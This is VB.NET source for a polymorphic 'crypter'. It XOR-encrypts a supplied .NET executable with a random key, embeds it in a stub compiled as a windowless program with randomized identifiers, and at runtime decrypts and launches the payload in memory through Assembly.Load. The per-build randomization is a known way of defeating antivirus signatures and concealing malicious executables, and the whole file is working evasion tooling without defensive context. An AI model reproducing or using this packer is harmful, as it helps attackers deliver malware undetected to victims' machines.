Imports System.CodeDom.Compiler
Imports System.IO
Imports System.Reflection
Imports System.Security.Cryptography

Module PolymorphicGenerator
    Dim rnd As New Random()

    Sub Main()
        If Not File.Exists(Command()) Then
            Console.WriteLine("File not found!")
            End
        End If

        Dim FileName_ToPack = IO.Path.GetFileName(Command())
        Dim FileName_NoExt = IO.Path.GetFileNameWithoutExtension(FileName_ToPack)

        Directory.SetCurrentDirectory(IO.Path.GetDirectoryName(Path.GetFullPath(FileName_ToPack)))

        Dim provider As New VBCodeProvider()
        Dim options As New CompilerParameters()

        Dim genBuildName = GenerateRandomString()

        Dim buildOutName = $"{genBuildName}.exe"

        options.OutputAssembly = buildOutName
        options.CompilerOptions = "/target:winexe"
        options.GenerateExecutable = True

        options.ReferencedAssemblies.Add("System.dll")
        options.ReferencedAssemblies.Add("System.IO.dll")

        Dim payloadName = GenerateRandomString(),
            xorFunctionName = GenerateRandomString(),
            injectionSubName = GenerateRandomString(),
            streamVarName = GenerateRandomString(),
            payloadArgName = GenerateRandomString(),
            xorInputArgName = GenerateRandomString(),
            xorKeyArgName = GenerateRandomString()


        File.Copy(FileName_ToPack, payloadName)

        Dim length As Integer = rnd.Next(10, 21),
            key(length - 1) As Byte
        rnd.NextBytes(key)

        File.WriteAllBytes(payloadName, XorEnc(File.ReadAllBytes(FileName_ToPack), key))

        options.EmbeddedResources.Add(payloadName)

        Dim keyArr As String = "{" & String.Join(", ", key.Select(Function(b) b.ToString())) & "}"

        ' Создание и добавление исходного кода

        Dim sourceCode As String = $"
Imports System.IO
Imports System.Reflection

Module {GenerateRandomString()}
Sub Main()
    Using {streamVarName} As Stream = Assembly.GetExecutingAssembly().GetManifestResourceStream(""{payloadName}"")
        If Not {streamVarName} Is Nothing Then
            Using reader As New BinaryReader({streamVarName})
                {injectionSubName}( {xorFunctionName}(reader.ReadBytes(CInt({streamVarName}.Length)) , {keyArr} ) )
            End Using
        End If
    End Using
End Sub

Sub {injectionSubName}({payloadArgName}) ' injection
    Assembly.Load({payloadArgName}).EntryPoint.Invoke(Nothing, Nothing)
End Sub

Function {xorFunctionName}({xorInputArgName} As Byte(), {xorKeyArgName} As Byte()) As Byte() ' decryption
    Dim encryptedArray({xorInputArgName}.Length - 1) As Byte
    For i As Integer = 0 To {xorInputArgName}.Length - 1
        encryptedArray(i) = {xorInputArgName}(i) Xor {xorKeyArgName}(i Mod {xorKeyArgName}.Length)
    Next
    Return encryptedArray
End Function
End Module"
        Dim results As CompilerResults = provider.CompileAssemblyFromSource(options, sourceCode)

        ' Проверка ошибок компиляции и вывод их в форму
        If results.Errors.Count > 0 Then
            For Each errorObj As CompilerError In results.Errors
                Console.WriteLine(errorObj.ErrorText, &H10)
            Next
        Else
            Dim FileCreated = $"{FileName_ToPack}_xor-packed.exe"
            If File.Exists(FileCreated) Then
                File.Delete(FileCreated)
            End If
            File.Delete(payloadName)
            File.Move(buildOutName, FileCreated)
            Console.WriteLine("File created successfully: " & FileCreated)
        End If
    End Sub

    Function XorEnc(inputArray As Byte(), keyArray As Byte()) As Byte()
        Dim encryptedArray(inputArray.Length - 1) As Byte
        For i As Integer = 0 To inputArray.Length - 1
            encryptedArray(i) = inputArray(i) Xor keyArray(i Mod keyArray.Length)
        Next
        Return encryptedArray
    End Function

    Private Function GenerateRandomString() As String
        Dim allowedChars() As Char = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ".ToCharArray()
        Dim length As Integer = rnd.Next(10, 31)
        Dim chars(length - 1) As Char

        For i As Integer = 0 To length - 1
            chars(i) = allowedChars(rnd.Next(0, allowedChars.Length))
        Next

        Return New String(chars)
    End Function
End Module
